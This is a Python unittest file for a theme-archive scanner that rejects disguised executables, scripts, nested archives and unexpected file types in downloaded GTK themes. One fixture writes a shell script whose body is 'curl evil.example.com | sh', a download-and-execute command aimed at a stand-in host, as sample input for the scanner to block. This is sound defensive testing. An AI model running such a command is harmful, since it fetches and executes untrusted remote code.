"""
Tests for scanner.py — the content-based check that blocks installation
if anything that isn't a legitimate theme asset turns up in a downloaded
archive. Checks are content-based (magic bytes / shebang), not just
extension-based, so a renamed malicious file must still be caught.
"""
import os
import sys
import shutil
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from themeswitch import scanner


class TestScanner(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write(self, rel_path: str, data: bytes):
        full = os.path.join(self.tmp, rel_path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as f:
            f.write(data)
        return full

    # ---- legitimate theme content must pass cleanly -----------------
    def test_normal_theme_files_pass_clean(self):
        self._write("index.theme", b"[Desktop Entry]\nType=X-GNOME-Metatheme\n")
        self._write("gtk-3.0/gtk.css", b"/* styles */ window { background: #222; }")
        self._write("gtk-3.0/settings.ini", b"[Settings]\ngtk-font-name=Sans 10")
        self._write("assets/icon.svg", b"<svg xmlns='http://www.w3.org/2000/svg'></svg>")
        self._write("assets/toggle-on.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 20)
        self._write("README.md", b"# A theme\n")
        self._write("LICENSE", b"MIT License\n")
        res = scanner.scan_directory(self.tmp)
        self.assertTrue(res.ok, res.findings)
        self.assertEqual(res.files_scanned, 7)

    def test_xcursor_binary_files_in_cursors_dir_pass(self):
        self._write("cursors/left_ptr", b"Xcur" + b"\x00" * 20)
        res = scanner.scan_directory(self.tmp)
        self.assertTrue(res.ok, res.findings)

    # ---- content-based detection: disguised files must be caught ----
    def test_elf_binary_disguised_as_png_is_blocked(self):
        self._write("gtk-3.0/icon.png", b"\x7fELF" + b"\x00" * 60)
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertIn("ELF", res.findings[0].reason)

    def test_pe_exe_disguised_as_css_is_blocked(self):
        self._write("gtk-3.0/gtk.css", b"MZ" + b"\x00" * 60)
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertIn("PE/DOS", res.findings[0].reason)

    def test_shell_script_disguised_as_theme_file_is_blocked(self):
        self._write("index.theme", b"#!/bin/bash\ncurl evil.example.com | sh\n")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertIn("shebang", res.findings[0].reason)

    def test_nested_archive_is_blocked(self):
        self._write("assets/bundle.png", b"PK\x03\x04" + b"\x00" * 60)
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertIn("nested zip", res.findings[0].reason)

    def test_unrecognised_binary_in_cursors_dir_blocked(self):
        self._write("cursors/left_ptr", b"\x7fELF" + b"\x00" * 20)
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)

    # ---- extension-based detection for non-magic-byte scripts -------
    def test_python_script_blocked_by_extension(self):
        self._write("hooks/setup.py", b"print('just a comment, no shebang')")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertIn(".py", res.findings[0].reason)

    def test_shared_library_blocked_by_extension(self):
        self._write("lib/helper.so", b"not actually ELF but still disallowed by extension")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)

    def test_unexpected_extension_blocked(self):
        self._write("data/mystery.dat", b"\x00\x01\x02\x03")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)

    def test_unrecognised_no_extension_file_blocked(self):
        self._write("mystery_binary", b"\x00\x01\x02\x03")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)

    def test_desktop_file_blocked(self):
        # A .desktop file carries an Exec= line — not a theme asset.
        self._write("setup.desktop", b"[Desktop Entry]\nExec=malicious-command\n")
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)

    # ---- symlinks already validated at extraction time, not re-checked
    def test_symlinks_skipped_not_double_checked(self):
        target = self._write("real_icon.svg", b"<svg></svg>")
        link = os.path.join(self.tmp, "linked_icon.svg")
        os.symlink(target, link)
        res = scanner.scan_directory(self.tmp)
        self.assertTrue(res.ok, res.findings)

    def test_multiple_findings_all_reported(self):
        self._write("a.sh", b"#!/bin/sh\necho hi\n")
        self._write("b.exe", b"MZ" + b"\x00" * 10)
        self._write("c.theme", b"[Desktop Entry]\n")  # legit, should not appear in findings
        res = scanner.scan_directory(self.tmp)
        self.assertFalse(res.ok)
        self.assertEqual(len(res.findings), 2)


if __name__ == "__main__":
    unittest.main()
